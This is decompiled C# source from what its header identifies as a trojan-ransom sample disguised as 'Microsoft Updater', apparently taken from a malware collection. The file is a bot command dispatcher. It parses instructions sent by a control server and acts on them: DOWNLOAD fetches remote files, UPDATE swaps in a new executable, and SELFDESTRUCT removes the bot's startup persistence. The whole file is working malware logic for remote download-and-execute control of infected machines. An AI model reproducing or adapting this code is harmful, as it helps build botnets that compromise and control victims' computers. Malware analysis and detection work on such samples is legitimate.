// Decompiled with JetBrains decompiler
// Type: Epidemic_HTTP.Commands
// Assembly: Microsoft Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2B3032-0636-4B8C-A49B-30EA659CCFCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Foreign.neod-4b5461e9b7975d274b77e2b28ee9fc7a71cf3294652993dfd23081524d2a783e.exe

using System;
using System.Threading;

namespace Epidemic_HTTP
{
  internal class Commands
  {
    private static string[] commands = (string[]) null;

    public Commands(string[] ucommands) => Commands.commands = ucommands;

    public void ProcessCommands()
    {
      try
      {
        for (int index = 0; index < Commands.commands.Length; ++index)
        {
          string command = (string) null;
          string flags = (string) null;
          string str = (string) null;
          string[] args = (string[]) null;
          try
          {
            command = Functions.GetStringInBetween("COMMAND=", "<br />", Commands.commands[index], false, false)[0];
            args = Functions.GetStringInBetween("ARGS=", "<br />", Commands.commands[index], false, false)[0].Split(' ');
            flags = Functions.GetStringInBetween("FLAGS=", "<br />", Commands.commands[index], false, false)[0];
            str = Commands.commands[index].Substring(Commands.commands[index].IndexOf("VERSION=") + 8);
            Console.WriteLine(">" + str + "<  ---- " + Commands.commands[index]);
          }
          catch
          {
          }
          double version = 0.0;
          if (str.Length > 0)
            version = Convert.ToDouble(str);
          if (command != null)
            this.DoCommand(command, args, flags, version);
        }
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
      }
    }

    private void DoCommand(string command, string[] args, string flags, double version)
    {
      try
      {
        if (Config.bot_version < version && !(command == "UPDATE"))
          return;
        switch (command)
        {
          case "DOWNLOAD":
            if (!Config.debug)
            {
              new Thread(new ThreadStart(new Download(args[0], args[1], false).DownloadFile)).Start();
              break;
            }
            break;
          case "UPDATE":
            Console.WriteLine("k got update command........ is " + (object) version + " gr8r dan " + (object) Config.bot_version + "?");
            if (version > Config.bot_version && !Config.debug)
            {
              Console.WriteLine(version.ToString() + " must b gr8r den my version " + (object) Config.bot_version);
              Console.WriteLine("aight gonna upd8 with exe " + args[0] + " as a uhhh " + args[1]);
              new Thread(new ThreadStart(new Download(args[0], args[1], true).DownloadFile)).Start();
              break;
            }
            break;
          case "SELFDESTRUCT":
            new Thread(new ThreadStart(new Startup().RemoveStartup)).Start();
            break;
        }
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
      }
    }
  }
}
